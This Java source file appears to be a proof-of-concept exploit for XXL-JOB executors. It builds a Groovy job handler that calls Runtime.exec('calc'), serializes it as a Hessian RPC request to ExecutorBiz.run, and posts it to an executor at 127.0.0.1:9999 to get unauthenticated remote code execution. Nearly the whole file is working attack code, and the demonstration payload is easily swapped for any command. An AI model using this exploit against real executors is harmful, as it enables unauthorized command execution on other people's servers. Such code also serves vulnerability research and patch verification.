package com.example;

import com.xxl.job.core.biz.model.TriggerParam;
import com.xxl.rpc.remoting.net.params.XxlRpcRequest;

import com.xxl.rpc.serialize.impl.HessianSerializer;
import org.asynchttpclient.AsyncCompletionHandler;
import org.asynchttpclient.AsyncHttpClient;
import org.asynchttpclient.DefaultAsyncHttpClient;
import org.asynchttpclient.Response;

import java.io.IOException;
import java.util.Date;

public class App {

    private static void sendData(String url, byte[] bytes) {
        AsyncHttpClient c = new DefaultAsyncHttpClient();

        try{
            c.preparePost(url)
            .setBody(bytes)
            .execute(new AsyncCompletionHandler<Response>() {
                @Override
                public Response onCompleted(Response response) throws Exception {
                    System.out.println("Server Return Data: ");
                    System.out.println(response.getResponseBody());
                    return response;
                }

                @Override
                public void onThrowable(Throwable t) {
                    System.out.println("HTTP出现异常");
                    t.printStackTrace();
                    super.onThrowable(t);
                }
            }).toCompletableFuture().join();

            c.close();
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            try {
                c.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }


    }

    public static void main( String[] args ) throws Exception {

        String code = "package com.xxl.job.service.handler;\n" +
                "\n" +
                "import com.xxl.job.core.log.XxlJobLogger;\n" +
                "import com.xxl.job.core.biz.model.ReturnT;\n" +
                "import com.xxl.job.core.handler.IJobHandler;\n" +
                "import java.lang.Runtime;\n" +
                "\n" +
                "public class DemoGlueJobHandler extends IJobHandler {\n" +
                "\n" +
                "\t@Override\n" +
                "\tpublic ReturnT<String> execute(String param) throws Exception {\n" +
                "      \tRuntime.getRuntime().exec(\"calc\");\n" +
                "\t\treturn ReturnT.SUCCESS;\n" +
                "\t}\n" +
                "\n" +
                "}\n";

        System.out.println(code);

        TriggerParam params = new TriggerParam();
        params.setJobId(10);
        params.setExecutorBlockStrategy("SERIAL_EXECUTION");
        params.setLogId(10);
        params.setLogDateTime((new Date()).getTime());
        params.setGlueType("GLUE_GROOVY");
        params.setGlueSource(code);
        params.setGlueUpdatetime((new Date()).getTime());

        XxlRpcRequest xxlRpcRequest = new XxlRpcRequest();
        xxlRpcRequest.setRequestId("111");
        xxlRpcRequest.setClassName("com.xxl.job.core.biz.ExecutorBiz");
        xxlRpcRequest.setMethodName("run");
        xxlRpcRequest.setParameterTypes(new Class[]{TriggerParam.class});
        xxlRpcRequest.setParameters(new Object[] {params});
        xxlRpcRequest.setCreateMillisTime((new Date()).getTime());

        HessianSerializer serializer = new HessianSerializer();

        byte[] data = serializer.serialize(xxlRpcRequest);
        sendData("http://127.0.0.1:9999", data);

    }
}
